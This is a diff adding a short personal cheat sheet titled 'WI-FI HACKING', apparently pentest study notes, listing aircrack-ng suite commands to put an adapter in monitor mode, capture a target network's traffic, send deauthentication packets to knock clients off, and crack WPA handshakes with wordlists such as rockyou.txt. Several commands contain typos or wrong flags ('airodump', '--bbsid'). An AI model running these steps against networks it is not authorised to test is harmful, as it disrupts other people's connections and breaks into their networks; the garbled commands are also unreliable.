@@ -1,0 +1,41 @@
+###### WI-FI HACKING ######
+
+Note: ALL ACTIONS MUST BE TAKEN IN ROOT OR USE SUDO AND WIFI ADAPTER MUST BE IN MONITOR MODE
+
+
+########## MONITOR MODE SET-UP ###########
+
+airmon-ng
+
+airmon-ng start wlan0
+
+##### RECONNAISANCE #######
+
+airodump wlan0
+
+TIP: The lower the power the closer the wireless pointrr
+
+airodump-ng --channel <channel number> --bbsid <router bssid> --write <Desiredfilename> wlan0
+  
+												                --> keep running until the end of the hack session.
+
+airodump-ng -c <channel number> --bssid <router bssid> -w <file name / desired location (listfull directory)>
+
+TIP: The BSSID number is also the device mAC address
+
+########## DEAUTHENTICATION ATTACK ##########
+
+command-->> aireplay-ng --deauth <number_of_deauth_packets> -a <wifi_bssid> -c <target_bssid> wlan0
+					
+						Alternatively
+
+	    aireplay-ng -0 <number_of_deuath_packets> -a <wifi_bssid> -c <target_bssid> wlan0
+
+######## WPA CRACKING #########
+
+WPA has a more security and we would have to carry out a dictionary attcack, a popular wordlist would be seclist (can be taken from github), and rockyou.txt, they usaully come with a kali machine pre installed, it would be located by navigating to /usr/share/wordlist/* directory.
+
+
+commmands-->> aircrack-ng -a2 -b <> -w <wordlist fullpath> wifi.cap file (full path)
+
+TIP: The number 2 specifies what wpa version it is
